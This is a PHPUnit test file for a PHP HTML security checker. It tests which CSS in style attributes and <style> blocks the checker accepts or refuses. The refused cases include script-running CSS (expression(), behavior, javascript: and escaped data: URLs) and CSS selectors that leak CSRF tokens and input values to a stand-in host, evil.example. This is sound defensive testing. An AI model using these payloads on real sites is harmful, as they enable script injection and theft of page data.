<?php
declare(strict_types=1);

namespace Itools\HtmlSecurityCheck\Tests\Unit;

use Itools\HtmlSecurityCheck\Tests\Support\HtmlSecurityCheckTestCase;
use PHPUnit\Framework\Attributes\DataProvider;

/**
 * CSS in the style attribute and the <style> element: the constructs that ran script in
 * some browser, backslash escapes that hide them, the schemes url() may use, and the two
 * selectors that let a style sheet leak what is on the page.
 *
 * Code: css-not-allowed.
 */
final class CssTest extends HtmlSecurityCheckTestCase
{
    //region Allowed

    #[DataProvider('allowedCssProvider')]
    public function testAllowedCss(string $css): void
    {
        $this->assertAccepts('<p style="' . htmlspecialchars($css, ENT_QUOTES) . '">x</p>');
        $this->assertAccepts("<style>p { $css }</style>");
    }

    public static function allowedCssProvider(): array
    {
        return [
            'plain'                 => ['color: red; font-size: 12px'],
            'relative url'          => ['background: url(images/bg.png)'],
            'root url'              => ["background: url('/images/bg.png')"],
            'https url'             => ['background: url("https://cdn.example.com/bg.png")'],
            'http url'              => ['background: url(http://example.com/bg.png)'],
            'protocol relative url' => ['background: url(//cdn.example.com/bg.png)'],
            'fragment url'          => ['clip-path: url(#clip)'],
            'space in a quoted url' => ["background: url('images/my bg.png')"],
            'font family quotes'    => ["font-family: 'Open Sans', Arial"],
            'word paste'            => ['mso-bidi-font-weight: normal; tab-stops: 36.0pt'],
            'position fixed'        => ['position: fixed; top: 0; z-index: 9999'],   // a phishing overlay, not script: a known non-goal
            'scroll-behavior'       => ['scroll-behavior: smooth; overscroll-behavior: contain'],
            'charset'               => ['@charset "UTF-7";'],   // read only at the start of a stylesheet file, never in a page
            'modern colors'         => ['color: oklch(0.55 0.2 250); background: color-mix(in srgb, lab(50% 40 59), hwb(0 0% 0%)); border-color: light-dark(#000, #fff)'],   // Tailwind 4 writes oklch()
            'gradient'              => ['background: linear-gradient(to right, rgba(0,0,0,.5), #fff)'],
            'transform and calc'    => ['transform: translateX(calc(100% - 2px)) rotate(45deg); width: var(--w, min(10px, 2em))'],
            'at sign in a bare url' => ['background: url(https://cdn.example.com/logo@2x.png)'],   // part of the URL, not an at-rule
            'function in a string'  => ["content: 'image-set( @import'"],
            'empty'                 => [''],
        ];
    }

    public function testStyleElementContentIsCheckedAsCss(): void
    {
        $this->assertAccepts('<style>@media print { p { display: none } } .a::before { content: "x" }</style>');
        $this->assertRejects('<style>.a::before { content: "<script>" }</style>', 'less-than-in-text', '<script>" }');   // text to the tokenizer, never a script tag; the < is refused on its own
    }

    /** What Word, Mailchimp and Wikipedia stylesheets use: the at-rules on CSS_AT_RULES and functions inside them */
    public function testStyleElementAtRulesPass(): void
    {
        $this->assertAccepts('<style>@font-face { font-family: "Cambria Math"; src: local("Cambria Math"), url(f.woff) format("woff") }</style>');
        $this->assertAccepts('<style>@page WordSection1 { size: 612.0pt 792.0pt } @list l0:level1 { mso-level-tab-stop: none }</style>');
        $this->assertAccepts('<style>@media(min-width:720px){.a:not(.b){color:red}}@supports (display:grid){.c{display:grid}}</style>');
        $this->assertAccepts('<style>@keyframes spin { to { transform: rotate(360deg) } }</style>');
    }

    public function testTextAfterStyleIsNotCss(): void
    {
        $this->assertAccepts('<style>p { color: red }</style><p>expression( is just text here</p>');
    }

    //endregion
    //region Refused

    #[DataProvider('refusedCssProvider')]
    public function testRefusedCss(string $css, string $detail): void
    {
        $violation = $this->assertRejects("<p style=\"$css\">x</p>", 'css-not-allowed', $detail);
        $this->assertSame("CSS containing $detail is not allowed", $violation->message);
        $this->assertRejects("<style>p { $css }</style>", 'css-not-allowed', $detail);
    }

    public static function refusedCssProvider(): array
    {
        return [
            'expression'            => ['width: expression(alert(1))', 'expression('],
            'expression uppercase'  => ['width: EXPRESSION(alert(1))', 'EXPRESSION('],
            'behavior'              => ['behavior: url(x.htc)', 'behavior:'],
            'behavior with space'   => ['behavior : url(x.htc)', 'behavior :'],
            'behavior star hack'    => ['*behavior: url(x.htc)', 'behavior:'],   // IE7 read *behavior as behavior
            'behavior underscore'   => ['_behavior: url(x.htc)', 'behavior:'],   // and IE6 read _behavior
            'ms-behavior'           => ['-ms-behavior: url(x.htc)', '-ms-behavior:'],   // IE8's prefixed name
            'ms-behavior uppercase' => ['-MS-Behavior : url(x.htc)', '-MS-Behavior :'],
            'moz-binding'           => ['-moz-binding: url(x.xml#a)', '-moz-binding'],
            'import'                => ['@import url(https://example.com/x.css)', '@import'],
            'backslash escape'      => ['width: e\\78 pression(alert(1))', '\\'],
            'image function'        => ['background: image(x.png)', 'image('],
            'image-set function'    => ['background: image-set(x.png 1x)', 'image-set('],
            'src function'          => ['background: src(x.png)', 'src('],
            'prefixed image-set'    => ['background: -webkit-image-set(x.png 1x)', '-webkit-image-set('],
            'unlisted function'     => ['background: cross-fade(url(a.png), url(b.png), 50%)', 'cross-fade('],   // a function browsers add later is refused until it is listed
            'unlisted at-rule'      => ['@layer base { p { color: red } }', '@layer'],
            'function after url'    => ['background: url(a.png) element(#a)', 'element('],   // the url() is stepped over, the scan resumes after it
            'javascript url'        => ['background: url(javascript:x)', 'url(javascript:x)'],
            'javascript url quoted' => ["background: url('javascript:x')", 'url(javascript:x)'],
            'javascript url spaced' => ['background: url( javascript:x )', 'url(javascript:x)'],
            'tab in a quoted url'   => ["background: url('java\tscript:x')", 'url(java\tscript:x)'],   // a browser drops the tab when it reads the URL
            'newline in quoted url' => ["background: url('java\nscript:x')", 'url(java\nscript:x)'],
            'url with parens'       => ['background: url(javascript:alert(1))', 'url(javascript:alert)'],   // an unquoted argument ends at the first ( or )
            'data url'              => ['background: url(data:image/svg+xml,<svg/>)', 'url(data:image/svg+xml,<svg/>)'],
            'vbscript url'          => ['background: url(vbscript:x)', 'url(vbscript:x)'],
            'unknown scheme url'    => ['background: url(ftp://example.com/x.png)', 'url(ftp://example.com/x.png)'],
            'mailto url'            => ['background: url(mailto:a@b.c)', 'url(mailto:a@b.c)'],
            'url uppercase'         => ['background: URL(JAVASCRIPT:x)', 'url(JAVASCRIPT:x)'],
            'url after a comment'   => ['/*url(*/background:url(javascript:x)', 'url(javascript:x)'],   // the url( in the comment is read on its own
            'url after a string'    => ["content: 'url('; background: url(javascript:x)", 'url(javascript:x)'],
        ];
    }

    public function testEntitiesInStyleAttributeDecodeBeforeTheCheck(): void
    {
        $this->assertRejects('<p style="width: expression&#40;alert(1))">x</p>', 'css-not-allowed', 'expression(');
    }

    public function testStyleElementContentIsNotEntityDecoded(): void
    {
        $this->assertAccepts('<style>p::before { content: "expression&#40;" }</style>');   // raw text to a browser, so the entity stays
    }

    //endregion
    //region Comments and Strings

    /**
     * A comment or a quoted string cannot spell a property, a function or a selector, so a
     * backslash inside one is a character, not an escape to check. Email templates draw comment
     * banners with backslashes and Word pastes quote font names like "\@Yu Mincho".
     */
    #[DataProvider('commentAndStringProvider')]
    public function testBackslashesInCommentsAndStringsPass(string $css): void
    {
        $this->assertAccepts("<p style=\"$css\">x</p>");
        $this->assertAccepts("<style>p { $css }</style>");
    }

    public static function commentAndStringProvider(): array
    {
        return [
            'comment banner'     => ['/* \\/\\/\\/ CLIENT STYLES \\/\\/\\/ */ color: red'],
            'path in a comment'  => ['/* C:\\Users\\shared\\brand.css */ color: red'],
            'unclosed comment'   => ['color: red /* runs to the end \\'],
            'escape in a string' => ["content: '\\a0 \\b7 '"],
            'word font name'     => ["font-family: '\\@Yu Mincho', serif"],
            'escaped quote'      => ["content: 'it\\'s'"],
        ];
    }

    /** Blanking stops exactly where the browser's CSS tokenizer does, so nothing outside a comment or string is hidden */
    #[DataProvider('escapeOutsideCommentOrStringProvider')]
    public function testEscapesOutsideCommentsAndStringsAreRefused(string $css, string $detail): void
    {
        $this->assertRejects("<p style=\"$css\">x</p>", 'css-not-allowed', $detail);
        $this->assertRejects("<style>p { $css }</style>", 'css-not-allowed', $detail);
    }

    public static function escapeOutsideCommentOrStringProvider(): array
    {
        return [
            'after a comment'           => ['/* x */ width: e\\78 pression(1)', '\\'],
            'after a string'            => ["content: 'x'; width: e\\78 pression(1)", '\\'],
            'comment start in a string' => ["content: '/*'; width: e\\78 pression(1) /* */", '\\'],   // the quote comes first, so /* is text and the escape is live
            'newline ends a string'     => ["content: 'x\n; width: e\\78 pression(1)", '\\'],           // a bare newline ends a CSS string, so the escape is live
            'escape in a quoted url'    => ["background: url('\\6a avascript:x')", "url('\\"],         // a string escape still spells a scheme here
            'escape in a bare url'      => ['background: url(\\6a avascript:x)', '\\'],
        ];
    }

    /**
     * A hex escape eats the one whitespace after it, newline included, so "\a<newline>" is still one
     * string: the check ends it where the browser does, and what follows the closing quote stays live
     */
    public function testHexEscapeEatsTheNewlineAfterIt(): void
    {
        $this->assertRejects("<style>p{--x:\"\\a\n\"}p[title^=a]{color:red}</style>", 'css-not-allowed', '[title^=');   // the scan's marker
        $this->assertRejects("<style>p{--x:'\\201c\n'}p[title^=a]{color:red}</style>", 'css-not-allowed', '[title^=');
        $this->assertAccepts("<style>p { content: \"\\201C\n\" }</style>");
        $this->assertAccepts("<style>p { content: \"\\abcdef0\" }</style>");   // six hex digits at most, the 0 is text
    }

    /**
     * An unquoted url() runs to its closing paren, so /* or a quote inside it is part of the URL and
     * does not start a comment or string that would hide the rules after it
     */
    #[DataProvider('unquotedUrlProvider')]
    public function testUnquotedUrlsDoNotStartCommentsOrStrings(string $css, string $detail): void
    {
        $this->assertRejects("<style>$css</style>", 'css-not-allowed', $detail);
    }

    public static function unquotedUrlProvider(): array
    {
        return [
            'comment start, closed later' => ['a{b:url(/*)}p[title^=a]{color:red}/* */', '[title^='],
            'comment start, never closed' => ['a{b:url(/*)}p[title^=a]{color:red}', '[title^='],
            'double quote'                => ['x{background:url(x");}p[title^="a"]{color:red}/*"*/', '[title^='],
            'single quote'                => ["a{b:url(x')}[id^=m]{color:red}/*'*/", '[id^='],
        ];
    }

    /**
     * url( is a URL only where it starts a name. After a digit, # or a non-ASCII letter it is a
     * number, hash or longer name and then a ( block, so the comment inside is real and the quote
     * in it starts nothing (Chrome applies [title^=a] in each of these)
     */
    #[DataProvider('notAUrlProvider')]
    public function testUrlAfterANameCharacterIsNotAUrl(string $css): void
    {
        $this->assertRejects("<style>$css</style>", 'css-not-allowed', '[title^=');
    }

    public static function notAUrlProvider(): array
    {
        return [
            'dimension'        => ["a{a:1url(/*)'*/)}[title^=a]{color:red}"],
            'dimension, zero'  => ['a{--x:0url(/*)"*/)}[title^=a]{color:red}'],
            'hash'             => ["a{--x:#url(/*)'*/)}[title^=a]{color:red}"],
            'non-ASCII name'   => ["a{--x:\u{e9}url(/*)'*/)}[title^=a]{color:red}"],
        ];
    }

    /**
     * After a space or a colon url( starts a URL token, so the quote inside it is part of the URL and
     * the quote after it starts a string that runs to the end: Chrome does not apply the rule either
     */
    public function testUrlAfterAColonIsStillAUrl(): void
    {
        $this->assertAccepts("<style>a{background:url(/*)'*/)}[title^=a]{color:red}</style>");
    }

    public function testQuotedUrlsAndStringsStillComeFirst(): void
    {
        $this->assertAccepts('<style>a{b:url("x") /* [t^=a] */}</style>');            // a quoted url is a string, so the comment after it is real
        $this->assertAccepts('<style>p{content:"url(/*"; color: red} /* [t^=a] */</style>');   // the string starts before url(, so it wins
    }

    /**
     * Function and at-rule names are read as CSS reads them: a comment or string ends the name before it,
     * and a name may start with --, a digit after --, or a non-ASCII letter
     */
    #[DataProvider('cssNameProvider')]
    public function testNamesAreReadAsCssReadsThem(string $css, string $detail): void
    {
        $this->assertRejects("<style>$css</style>", 'css-not-allowed', $detail);
    }

    public static function cssNameProvider(): array
    {
        return [
            'comment inside a name'       => ['a{b:u/**/rl(x)}', 'rl('],
            'three dashes'                => ['a{--x:---f(1)}', '---f('],
            'digit after two dashes'      => ['a{--x:--1f(1)}', '--1f('],
            'non-ASCII name'              => ["a{--x:\u{e9}(1)}", "\u{e9}("],
            'non-ASCII after two dashes'  => ["a{--x:--\u{e9}rgb(1)}", "--\u{e9}rgb("],
            'after a quoted url('        => ["a{b:url('a' image-set(x)}", 'image-set('],
            'after a closed quoted url()' => ["a{b:url('a') image-set(x)}", 'image-set('],
            'at-rule with two dashes'     => ['@--x{}', '@--x'],
            'non-ASCII at-rule'           => ["@\u{e9}{}", "@\u{e9}"],
        ];
    }

    /**
     * A comment ends the name before it, so the name after it is read on its own, and a name after #
     * or a number is a hash or a unit: none of these calls a function in a browser
     */
    public function testNamesAroundCommentsAndHashesPass(): void
    {
        $this->assertAccepts('<style>a{b:foo/**/rgb(1, 2, 3)}</style>');
        $this->assertAccepts('<style>a{--x:#image-set(x)}</style>');
        $this->assertAccepts('<style>a{--x:7--url(x)}</style>');
    }

    /**
     * A block past the PCRE limits is never passed unchecked: a block where comment removal
     * can't finish is refused, since the comments left in could split a selector, and the token
     * scan takes a megabyte of letters after a [ in one step, so it never reaches the limit there
     */
    public function testMegabyteBlocksAreStillChecked(): void
    {
        $stars = str_repeat('* ', 1024 * 1024);
        $this->assertRejects("<style>/* $stars */ p { color: red }</style>", 'css-not-allowed');
        $escapes = str_repeat('\\a', 1024 * 1024 + 512 * 1024);
        $this->assertRejects("<style>p { content: '$escapes'; width: expression(1) }</style>", 'css-not-allowed');
        $padding = str_repeat('a', 1024 * 1024 + 512 * 1024);
        $this->assertRejects("<style>[$padding width: expression(1)</style>", 'css-not-allowed', 'expression(');   // a [ with no ]= after it
        $this->assertRejects("<p style=\"[$padding width: expression(1)\">x</p>", 'css-not-allowed', 'expression(');
    }

    /**
     * A string that ends in a lone \ at the end of the block still matches, as CSS ends it there, so no
     * quote inside it is tried again as the start of a string (256 KB of \" pairs took 18 s with the JIT)
     */
    public function testStringEndingInABackslashStaysLinear(): void
    {
        $escapedQuotes = str_repeat('\\"', 128 * 1024);
        $this->assertAccepts("<style>a{x:\"$escapedQuotes\\</style>");
        $this->assertAccepts("<p style=\"x:'" . str_repeat("\\'", 128 * 1024) . "\\\">x</p>");
    }

    /**
     * Each url( argument is read up to the next ( when unquoted, so a run of url(url(url( reads each
     * one once (64 KB of them in a comment took 546 MB when every argument ran to the end)
     */
    public function testRepeatedUrlOpenersStayLinear(): void
    {
        $openers = str_repeat('url(', 256 * 1024);
        $this->assertAccepts("<style>/*$openers*/</style>");
        $this->assertAccepts("<p style=\"/*$openers*/\">x</p>");
        $this->assertAccepts("<style>a{b:'" . str_repeat("url('", 256 * 1024) . "'}</style>");
        $this->assertAccepts("<style>a{b:\"" . str_repeat('url("', 256 * 1024) . "\"}</style>");
    }

    /**
     * CR, CRLF and form feed end a CSS string like a newline does, and only CSS whitespace (space, tab,
     * newline) can come between url( and a quote. A style attribute can bring CR, FF and vertical tab in
     * from character references, and what follows must still be checked
     */
    #[DataProvider('newlineFromReferenceProvider')]
    public function testNewlinesFromCharacterReferencesEndAString(string $style, string $detail): void
    {
        $this->assertRejects("<p style=\"$style\">x</p>", 'css-not-allowed', $detail);
    }

    public static function newlineFromReferenceProvider(): array
    {
        return [
            'CR ends a string'           => ["'&#13;;background:image-set(url(x.png) 1x)", 'image-set('],
            'FF ends a string'           => ["'&#12;;background:image-set(url(x.png) 1x)", 'image-set('],
            'CRLF ends a string'         => ["'&#13;&#10;;background:image-set(url(x.png) 1x)", 'image-set('],
            'CR before an escape'        => ["'&#13;;background:url(\\64 ata:,x)", '\\'],
            'CRLF after a hex escape'    => ["'\\a&#13;&#10;';background:image-set(url(x.png) 1x)", 'image-set('],   // the escape eats the pair, so the ' closes the string
            'vertical tab after url('    => ["background:url(&#11;');background:url(\\6a avascript:x)", '\\'],   // a bad URL to a browser, which runs to the ), not a string
        ];
    }

    /**
     * A run of [ costs one step per bracket: the selector's name run stops at the next [ instead of
     * scanning to the end of the block from every one (100K brackets took 3 s with the JIT, 64 s without)
     */
    public function testBracketRunsStayLinear(): void
    {
        $brackets = str_repeat('[', 100000);
        $this->assertAccepts("<style>$brackets</style>");
        $this->assertRejects("<style>{$brackets}p[title^=a]{color:red}</style>", 'css-not-allowed', '[title^=');
        $this->assertRejects('<style>[a[title^=a]{color:red}</style>', 'css-not-allowed', '[title^=');   // the innermost [ is where the match starts
    }

    /**
     * Past pcre.backtrack_limit preg_match() returns false, and a false refuses the block instead of
     * passing it. Each x*| pair inside one [ is a step of the name run, so megabytes of them reach the
     * limit on either engine; the test lowers the limit so a few thousand do
     */
    public function testABlockPastThePcreLimitIsRefused(): void
    {
        $css    = '[' . str_repeat('x*|', 5000) . 'title^=a]{color:red}';
        $detail = '[' . str_repeat('x*|', 26) . 'x...';   // the first 80 characters of the block
        ini_set('pcre.backtrack_limit', '1000');
        try {
            $this->assertRejects("<style>$css</style>", 'css-not-allowed', $detail);
            $this->assertRejects("<p style=\"$css\">x</p>", 'css-not-allowed', $detail);
        } finally {
            ini_restore('pcre.backtrack_limit');
        }
    }

    //endregion
    //region Page Data Leaks

    /**
     * A selector that matches on page data plus a url() to another host sends that data there:
     * [value^="a"] tests an input's value one character at a time, and @font-face unicode-range
     * loads the font only when a character is on the page.
     */
    #[DataProvider('leakProvider')]
    public function testSelectorsThatLeakPageDataAreRefused(string $css, string $detail): void
    {
        $this->assertRejects("<style>$css</style>", 'css-not-allowed', $detail);
    }

    public static function leakProvider(): array
    {
        return [
            'starts with'            => ['input[name=csrf][value^="a"] { background: url(//evil.example/?a) }', '[value^='],
            'ends with'              => ['input[value$="a"] { background: url(//evil.example/?a) }', '[value$='],
            'contains'               => ['a[href*="token="] { background: url(//evil.example/?a) }', '[href*='],
            'spaces around'          => ['input[ value ^= "a" ] { color: red }', '[ value ^='],
            'comment inside'         => ['input[value/**/^="a"] { color: red }', '[value^='],   // comments are removed before the check, so the detail reads without it
            'uppercase'              => ['INPUT[VALUE^="a"] { color: red }', '[VALUE^='],
            'namespace wildcard'     => ['input[*|value^="a"] { background: url(//evil.example/?a) }', '[*|value^='],   // *| means any namespace, including none, so browsers read it as [value^=
            'comment in namespace prefix' => ['[*/**/|value^="a"] { color: red }', '[*|value^='],   // a comment between * and | is not whitespace to the CSS tokenizer; the selector still applies
            'comment in prefix, contains' => ['[*/**/|value*="a"] { color: red }', '[*|value*='],
            'scan marker'            => ['[*/**/|data-mark^=a]{color:red}', '[*|data-mark^='],
            'no url at all'          => ['input[value^="a"] { color: red }', '[value^='],   // the rule is the selector, whatever follows it
            'no element'             => ['[value*="abc"] { background: url(//evil.example/?abc) }', '[value*='],
            'through :has()'         => ['form:has([value^="a"]) { background: url(//evil.example/?a) }', '[value^='],   // a hidden input shows no background, so the form does
            'meta content'           => ['html:has(meta[content^="a"]) { background: url(//evil.example/?a) }', '[content^='],
            'allowed name as prefix' => ['[styles^=a] { color: red }', '[styles^='],
            'allowed name, longer'   => ['[srcset*=a] { color: red }', '[srcset*='],
            'allowed name as suffix' => ['[data-src*=a] { color: red }', '[data-src*='],
            'after an allowed name'  => ['[style^=a][value^=b] { color: red }', '[value^='],
            'unicode-range'          => ['@font-face { font-family: f; src: url(https://evil.example/f); unicode-range: U+65 }', 'unicode-range'],
            'unicode-range spaced'   => ['@font-face { unicode-range : U+65 }', 'unicode-range'],
        ];
    }

    #[DataProvider('harmlessSelectorProvider')]
    public function testOtherSelectorsPass(string $css): void
    {
        $this->assertAccepts("<style>$css</style>");
    }

    public static function harmlessSelectorProvider(): array
    {
        return [
            'exact match'            => ['input[type=text] { border: 1px solid #ccc }'],
            'exact match quoted'     => ['a[href="https://example.com/"] { color: red }'],
            'word match'             => ['[class~="x_body"] { margin: 0 }'],
            'dash match'             => ['[lang|="en"] { quotes: none }'],
            'presence'               => ['input[disabled] { opacity: .5 }'],
            'font-face without range' => ['@font-face { font-family: f; src: url(https://fonts.example/f.woff2) }'],
            'attribute selector then url' => ['input[type=text] { background: url(https://cdn.example/bg.png) }'],
        ];
    }

    /**
     * style, src and class hold layout, image addresses and class names, never a token, so substring
     * selectors on them pass. Real content uses them: email templates and Wikipedia's own styles
     */
    #[DataProvider('allowedSubstringSelectorProvider')]
    public function testSubstringSelectorsOnStyleSrcAndClassPass(string $css): void
    {
        $this->assertAccepts("<style>$css</style>");
    }

    public static function allowedSubstringSelectorProvider(): array
    {
        return [
            'email template fix'     => ['div[style*="margin: 16px 0"] { margin: 0 !important }'],
            'wikipedia logo'         => ['img[src*="Wiktionary-logo-v2.svg"] { border: 0 }'],
            'wikipedia not style'    => ['.thumbimage:not([style*="background-color"]) { background: #fff }'],
            'class prefix'           => ['a[class^="btn-"] { color: red }'],
            'ends with'              => ['img[src$=".png"] { border: 0 }'],
            'uppercase'              => ['[STYLE*="color"] { margin: 0 }'],
            'spaces around'          => ['[ style *= "x" ] { margin: 0 }'],
            'any namespace'          => ['[*|style^=x] { margin: 0 }'],
            'no namespace'           => ['[|src$=x] { margin: 0 }'],
            'named namespace'        => ['[ns|class*=x] { margin: 0 }'],
            'with a remote url'      => ['img[src*="logo"] { background: url(https://upload.example/x.png) }'],
        ];
    }

    //endregion
}
